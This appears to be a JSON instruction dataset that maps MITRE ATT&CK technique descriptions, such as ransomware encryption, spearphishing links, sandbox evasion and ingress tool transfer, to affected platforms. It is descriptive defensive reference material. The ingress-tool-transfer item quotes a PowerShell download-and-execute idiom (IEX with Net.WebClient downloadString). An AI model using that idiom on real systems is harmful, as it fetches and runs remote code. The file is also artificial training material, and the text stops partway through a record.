[
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Encrypted for Impact (T1486);\nTechnique Data Encrypted for Impact (T1486) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
      "answer": "The provided description is related to MITRE technique Data Encrypted for Impact (T1486);\nTechnique Data Encrypted for Impact (T1486) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens. These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. \n\nAdversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.",
    "context": "",
    "output": "The provided description is related to MITRE technique Phishing: Spearphishing Link (T1566.002);\nTechnique Phishing: Spearphishing Link (T1566.002) is applicable to platforms: Linux,  Office 365,  SaaS,  Windows,  macOS, Google Workspace;\nTherefore, the given procedure description is related to platforms: Linux,  Office 365,  SaaS,  Windows,  macOS, Google Workspace.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens. These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. \n\nAdversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.",
      "answer": "The provided description is related to MITRE technique Phishing: Spearphishing Link (T1566.002);\nTechnique Phishing: Spearphishing Link (T1566.002) is applicable to platforms: Linux,  Office 365,  SaaS,  Windows,  macOS, Google Workspace;\nTherefore, the given procedure description is related to platforms: Linux,  Office 365,  SaaS,  Windows,  macOS, Google Workspace.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
      "answer": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion: System Checks (T1497.001);\nTechnique Virtualization/Sandbox Evasion: System Checks (T1497.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use File and Directory Discovery to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
      "answer": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion: System Checks (T1497.001);\nTechnique Virtualization/Sandbox Evasion: System Checks (T1497.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
      "answer": "The provided description is related to MITRE technique Ingress Tool Transfer (T1105);\nTechnique Ingress Tool Transfer (T1105) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "answer": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.\n\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.",
    "context": "",
    "output": "The provided description is related to MITRE technique Acquire Infrastructure: Domains (T1583.001);\nTechnique Acquire Infrastructure: Domains (T1583.001) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for Phishing, Drive-by Compromise, and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via Drive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.\n\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.",
      "answer": "The provided description is related to MITRE technique Acquire Infrastructure: Domains (T1583.001);\nTechnique Acquire Infrastructure: Domains (T1583.001) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading: Match Legitimate Name or Location (T1036.005);\nTechnique Masquerading: Match Legitimate Name or Location (T1036.005) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "answer": "The provided description is related to MITRE technique Masquerading: Match Legitimate Name or Location (T1036.005);\nTechnique Masquerading: Match Legitimate Name or Location (T1036.005) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data from Network Shared Drive (T1039);\nTechnique Data from Network Shared Drive (T1039) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within cmd may be used to gather information.",
      "answer": "The provided description is related to MITRE technique Data from Network Shared Drive (T1039);\nTechnique Data from Network Shared Drive (T1039) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Software Discovery: Security Software Discovery (T1518.001);\nTechnique Software Discovery: Security Software Discovery (T1518.001) is applicable to platforms: Linux,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
